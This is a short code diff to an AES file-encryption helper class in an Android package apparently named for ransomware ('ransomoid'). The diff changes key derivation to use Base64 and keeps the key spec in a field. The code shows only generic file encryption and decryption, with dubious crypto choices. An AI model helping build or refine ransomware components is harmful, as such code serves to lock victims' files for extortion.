@@ -1,5 +1,7 @@
 package falezza.fabio.ransomoid.utils;
 
+import android.util.Base64;
+
 import java.io.File;
 import java.security.NoSuchAlgorithmException;
 import java.security.SecureRandom;
@@ -26,6 +28,8 @@ public class AesEncrypter {
     private byte[] iv;
     private byte[] key;
 
+    private SecretKeySpec skrr;
+
     private AesEncrypter() {}
 
     public static AesEncrypter getInstance() {
@@ -46,7 +50,8 @@ public class AesEncrypter {
     public byte[] encrypt() throws Exception {
         FileProcessor fileProcessor = FileProcessor.getInstance();
         byte[] bytes = fileProcessor.readBytes(this.file);
-        SecretKeySpec sKeySpec = new SecretKeySpec(getRawKey(this.key.toString()), "AES");
+        SecretKeySpec sKeySpec = new SecretKeySpec(getRawKey(Base64.encodeToString(this.key, Base64.NO_WRAP)), "AES");
+        this.skrr = sKeySpec;
         Cipher cipher = Cipher.getInstance("AES/CTR/PKCS5Padding");
         IvParameterSpec ivParameterSpec = new IvParameterSpec(this.iv);
         cipher.init(Cipher.ENCRYPT_MODE, sKeySpec, ivParameterSpec);
@@ -56,7 +61,7 @@ public class AesEncrypter {
     public byte[] decrypt() throws Exception {
         FileProcessor fileProcessor = FileProcessor.getInstance();
         byte[] bytes = fileProcessor.readBytes(this.file);
-        SecretKeySpec sKeySpec = new SecretKeySpec(getRawKey(this.key.toString()), "AES");
+        SecretKeySpec sKeySpec = new SecretKeySpec(getRawKey(Base64.encodeToString(this.key, Base64.NO_WRAP)), "AES");
         Cipher cipher = Cipher.getInstance("AES/CTR/PKCS5Padding");
         IvParameterSpec ivParameterSpec = new IvParameterSpec(this.iv);
         cipher.init(Cipher.DECRYPT_MODE, sKeySpec, ivParameterSpec);
